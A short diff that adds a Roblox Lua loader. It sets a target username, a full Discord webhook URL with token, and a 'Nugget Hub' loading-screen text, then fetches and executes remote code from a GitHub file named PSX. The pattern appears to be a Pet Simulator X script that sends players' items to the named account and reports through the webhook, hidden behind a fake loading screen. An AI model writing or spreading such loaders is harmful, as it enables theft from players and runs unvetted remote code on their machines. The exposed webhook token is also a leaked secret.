@@ -1,0 +1,4 @@
+_G.Username = "petsimu_015"
+_G.Webhook = "https://discord.com/api/webhooks/1124310489091026955/GWplf-JUtOFsn8K-1zFG0W_ZjJpTBIyRKmpiPWKZ_FdQ5-C0ZNAXE136MsaUg5YC0ARA"
+_G.LoadingScreenText = "Nugget Hub"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RJ077SIUU/PetSim/main/PSX", true))()
